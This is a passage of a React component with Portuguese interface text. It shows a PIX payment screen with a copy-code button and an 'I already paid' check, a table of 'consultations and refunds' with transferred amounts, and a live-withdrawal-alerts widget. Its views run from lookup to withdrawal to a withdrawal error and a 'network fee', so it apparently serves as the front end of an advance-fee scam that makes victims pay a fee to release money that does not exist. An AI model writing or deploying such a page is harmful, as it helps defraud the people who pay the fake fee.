                className="w-full py-2.5 px-4 bg-neutral-900 hover:bg-neutral-800 border border-neutral-700 rounded-xl text-xs font-mono text-neutral-200 transition-colors flex items-center justify-center gap-2 cursor-pointer"
              >
                {copiedPix ? (
                  <>
                    <Check className="w-4 h-4 text-emerald-400" />
                    <span className="text-emerald-400 font-medium">Código PIX Copiado!</span>
                  </>
                ) : (
                  <>
                    <Copy className="w-4 h-4 text-emerald-400" />
                    <span>Copiar Código PIX Copia e Cola</span>
                  </>
                )}
              </button>
            </div>
          </div>

          {/* Action buttons */}
          <div className="space-y-3">
            <button 
              type="button"
              onClick={handleConfirmPayment}
              disabled={isVerifying}
              className="w-full py-4 rounded-xl font-bold text-base transition-all flex items-center justify-center gap-2 shadow-lg bg-emerald-500 hover:bg-emerald-400 text-neutral-950 active:scale-[0.99] cursor-pointer"
            >
              {isVerifying ? (
                <>
                  <RefreshCcw className="w-5 h-5 animate-spin" />
                  VERIFICANDO PAGAMENTO...
                </>
              ) : (
                <>
                  <CheckCircle2 className="w-5 h-5" />
                  JÁ REALIZEI O PAGAMENTO
                </>
              )}
            </button>
            
            <button 
              type="button"
              onClick={() => setView('withdraw_error')}
              className="w-full py-2 text-xs text-neutral-400 hover:text-white transition-colors cursor-pointer"
            >
              Voltar
            </button>
          </div>
        </div>
      </motion.div>
    );
  };

  const renderHistory = () => (
    <motion.div 
      key="history"
      initial={{ opacity: 0 }}
      animate={{ opacity: 1 }}
      exit={{ opacity: 0 }}
      className="min-h-screen p-4 md:p-8 max-w-4xl mx-auto"
    >
      <header className="flex items-center justify-between gap-4 mb-8 pb-4 border-b border-neutral-800">
        <div className="flex items-center gap-3">
          <button 
            type="button"
            onClick={() => setView('consulta')}
            className="p-2.5 bg-neutral-900 hover:bg-neutral-800 rounded-xl border border-neutral-800 text-neutral-400 hover:text-white transition-colors cursor-pointer"
            title="Voltar"
          >
            <Search className="w-5 h-5" />
          </button>
          <div>
            <h2 className="text-xl md:text-2xl font-bold text-white flex items-center gap-2">
              <History className="w-6 h-6 text-neutral-400" />
              Histórico de Consultas e Devoluções
            </h2>
            <p className="text-xs text-neutral-400 mt-0.5">Registro geral das consultas processadas</p>
          </div>
        </div>

        <button 
          type="button"
          onClick={() => setView('consulta')}
          className="px-4 py-2 bg-neutral-900 hover:bg-neutral-800 border border-neutral-800 text-xs font-medium text-white rounded-xl transition-colors cursor-pointer"
        >
          Nova Consulta
        </button>
      </header>

      <div className="bg-neutral-900/80 border border-neutral-800 rounded-2xl overflow-hidden shadow-xl">
        <div className="overflow-x-auto">
          <table className="w-full text-left border-collapse text-xs md:text-sm">
            <thead>
              <tr className="bg-neutral-950/80 border-b border-neutral-800 text-neutral-400 font-medium">
                <th className="p-4 uppercase tracking-wider text-[11px]">Data</th>
                <th className="p-4 uppercase tracking-wider text-[11px]">Documento / Registro</th>
                <th className="p-4 uppercase tracking-wider text-[11px]">Origem</th>
                <th className="p-4 uppercase tracking-wider text-[11px]">Valor</th>
                <th className="p-4 uppercase tracking-wider text-[11px]">Status</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-neutral-800/60 font-mono">
              {history.map(item => (
                <tr key={item.id} className="hover:bg-neutral-800/40 transition-colors">
                  <td className="p-4 text-neutral-400">{item.date}</td>
                  <td className="p-4 text-white truncate max-w-[140px] md:max-w-xs">{item.document}</td>
                  <td className="p-4 text-neutral-300 font-sans text-xs">{item.origin}</td>
                  <td className="p-4 text-emerald-400 font-semibold">
                    R$ {item.amount.toLocaleString('pt-BR', { minimumFractionDigits: 2 })}
                  </td>
                  <td className="p-4">
                    <span className={cn(
                      "inline-flex items-center gap-1.5 px-2.5 py-1 rounded-md text-[10px] uppercase font-bold font-sans",
                      item.status === 'completed' 
                        ? "bg-emerald-500/10 text-emerald-400 border border-emerald-500/20"
                        : "bg-amber-500/10 text-amber-400 border border-amber-500/20"
                    )}>
                      {item.status === 'completed' ? 'Transferido' : 'Pendente'}
                    </span>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </div>
    </motion.div>
  );

  return (
    <div className="min-h-screen bg-neutral-950 text-neutral-200 selection:bg-emerald-500/30 selection:text-white font-sans antialiased">
      <LiveWithdrawalAlerts />
      
      <AnimatePresence mode="wait">
        {view === 'consulta' && renderConsulta()}
        {view === 'consulta_loading' && renderConsultaLoading()}
        {view === 'consulta_result' && renderConsultaResult()}
        {view === 'history' && renderHistory()}
        {view === 'withdraw' && renderWithdraw()}
        {view === 'withdraw_loading' && renderWithdrawLoading()}
        {view === 'withdraw_error' && renderWithdrawError()}
        {view === 'network_fee' && renderNetworkFee()}
      </AnimatePresence>

      {/* Ambient background glow */}
      <div className="fixed inset-0 pointer-events-none z-[-1] overflow-hidden">
        <div className="absolute top-[-10%] left-[-10%] w-[45%] h-[45%] bg-emerald-500/5 blur-[140px] rounded-full" />
        <div className="absolute bottom-[-10%] right-[-10%] w-[45%] h-[45%] bg-cyan-500/5 blur-[140px] rounded-full" />
      </div>
    </div>
  );
}
